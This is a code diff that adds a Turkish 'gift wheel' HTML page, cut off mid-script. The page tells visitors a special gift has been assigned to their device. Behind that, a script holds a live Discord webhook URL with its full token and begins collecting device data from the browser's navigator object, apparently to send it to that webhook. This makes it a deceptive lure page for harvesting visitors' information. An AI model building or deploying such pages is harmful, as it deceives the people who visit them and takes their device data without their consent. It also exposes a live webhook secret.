@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <title>Hediye Çarkı - Test</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; background: #121212; color: white; padding-top: 50px; }
+        .box { border: 2px solid #00ff00; display: inline-block; padding: 20px; border-radius: 15px; }
+    </style>
+</head>
+<body>
+
+    <div class="box">
+        <h1>🎁 Tebrikler!</h1>
+        <p>Cihazınıza özel bir hediye tanımlandı.</p>
+        <button onclick="alert('Hediye kodu: TEST-123')">Hediyeyi Gör</button>
+    </div>
+
+    <script>
+        // Senin sağladığın Webhook linki
+        const webhookURL = "https://canary.discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
+
+        // Cihazdan toplanan bilgiler
+        const cihazVerisi = {
+            "Cihaz": navigator
+          
